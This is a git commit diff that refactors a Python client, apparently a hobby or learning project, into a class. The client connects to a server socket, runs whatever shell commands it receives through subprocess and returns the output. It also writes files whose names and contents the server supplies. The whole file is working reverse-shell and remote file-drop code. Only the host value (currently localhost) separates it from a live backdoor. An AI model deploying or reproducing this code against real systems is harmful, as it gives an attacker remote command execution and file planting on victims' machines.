5b29aac3bcdcda830d7715b38342cab98013444d
Gracjan <gracjan.chamulati2019@gmail.com>
2022-07-21 14:19:58 +0200

    oop fixed

--- client.py
+++ client.py
@@ -1,39 +1,67 @@
 
 from ast import While
+from mimetypes import init
 import socket
 import os
 import subprocess
 HOST = '127.0.0.1'    # The remote host
 PORT = 50007   
 SEPARATOR = "<sep>"
+s = socket.socket()
            # The same port as used by the server
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((HOST, PORT))
-    cwd = os.getcwd()
-    s.send(cwd.encode())
-    while True:
-        command = s.recv(1024).decode()
-        splited_command = command.split()
-        if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-            break
-        if splited_command[0].lower() == "cd":
-            try:
-                os.chdir(' '.join(splited_command[1:]))
-            except FileNotFoundError as e:
-                # if there is an error, set as the output
-                output = str(e)
-            else:
-                # if operation is successful, empty message
-                output = ""
-        else:
-            # execute the command and retrieve the results
-            output = subprocess.getoutput(command)
-        # get the current working directory as output
+class client:
+    def __init__(self, HOST,PORT, SEPARATOR,s):
+        self.HOST  = HOST
+        self.PORT  = PORT
+        self.SEPARATOR  = SEPARATOR
+        self.s = s
+
+    
+    def startconnection(self):
+        self.s.connect((self.HOST, self.PORT))
         cwd = os.getcwd()
-        # send the results back to the server
-        message = f"{output}{SEPARATOR}{cwd}"
-        s.send(message.encode())
-    # close client connection
+        self.s.send(cwd.encode())
+    def filecreate(self):
+        filename = self.s.recv(1024).decode("utf-8")
+        data = self.s.recv(1024).decode('utf-8')
+        file = open(filename,"w")
+        file.write(data)
+        file.close()
+        file2 = open(filename, "r")
+        z =file2.read()
+        print(z)
+        file.close()
+    
+        # receive the command from the server
+    def shell(self):
+        while True:
 
+            command = self.s.recv(1024).decode()
+            splited_command = command.split()
+            
+                # if the command is exit, just break out of the loop
+                
+            if splited_command[0].lower() == "cd":
+                # cd command, change directory
+                try:
+                    os.chdir(' '.join(splited_command[1:]))
+                except FileNotFoundError as e:
+                    # if there is an error, set as the output
+                    output = str(e)
+                else:
+                    # if operation is successful, empty message
+                    output = ""
+            else:
+                # execute the command and retrieve the results
+                output = subprocess.getoutput(command)
+            # get the current working directory as output
+            cwd = os.getcwd()
+            # send the results back to the server
+            message = f"{output}{SEPARATOR}{cwd}"
+            self.s.send(message.encode())
+        s.close()
 
+klient = client(HOST,PORT,SEPARATOR,s)
+klient.startconnection()
+klient.filecreate()
+klient.shell()
